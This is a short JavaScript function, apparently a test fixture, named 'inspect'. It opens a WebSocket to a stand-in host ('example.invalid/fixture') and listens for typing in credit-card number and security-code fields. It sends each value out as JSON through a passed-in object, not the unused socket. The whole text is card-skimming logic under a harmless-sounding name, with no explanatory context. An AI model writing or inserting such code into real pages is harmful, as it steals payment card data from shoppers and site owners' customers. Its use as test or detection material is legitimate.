function inspect(document, WebSocket, display) {
  const channel = new WebSocket('wss://example.invalid/fixture');
  document.addEventListener('input', ev => {
    if (ev.target.matches('input[autocomplete="cc-number"],input[autocomplete="cc-csc"]')) {
      display.send(JSON.stringify({value: ev.target.value}));
    }
  });
}
